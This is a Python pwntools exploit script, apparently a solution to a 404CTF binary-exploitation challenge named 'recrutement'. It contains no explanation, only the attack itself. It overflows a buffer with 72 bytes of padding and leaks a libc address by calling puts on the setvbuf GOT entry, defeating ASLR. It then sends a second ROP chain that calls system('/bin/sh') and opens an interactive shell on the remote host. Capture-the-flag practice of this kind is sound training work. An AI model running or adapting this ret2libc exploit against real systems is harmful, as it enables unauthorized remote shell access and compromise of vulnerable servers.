from pwn import *

t = remote("challenge.404ctf.fr", 30690)
binary = ELF('recrutement')
context.binary = binary

t.recvuntil(b":")
t.sendline(b"scientifique")

t.recvuntil(b":")

# leak aslr
puts_plt = 0x400520
setvbuf_got = 0x601028
pop_rdi = 0x400763
pop_rsi_r15 = 0x400761
main = 0x400647

rop = ROP(binary)
rop.raw("0" * 72)
rop.raw(pop_rdi)
rop.raw(setvbuf_got)
rop.raw(puts_plt)
rop.raw(main)

print(rop.dump())
t.sendline(rop.chain())
t.recvuntil(b"peu.\n")
leak = t.recvline().strip()
print(leak)
leak += b"\x00" * (8 - len(leak))
leak = u64(leak)

# call system
libc = ELF('libc-2.27.so')
start_libc = leak - libc.symbols['setvbuf']
libc.address = start_libc
print(start_libc)

rop1 = ROP(libc)
rop1.raw("0" * 72)
rop1.raw(pop_rdi)
rop1.raw(next(libc.search(b'/bin/sh')))
rop1.raw(pop_rsi_r15)
rop1.raw(0)
rop1.raw(0)
rop1.raw(libc.symbols['system'])
rop1.raw(main)

t.recvuntil(b":")
t.sendline(b"scientifique")
t.recvuntil(b":")
print(rop1.dump())
t.sendline(rop1.chain())

t.interactive()
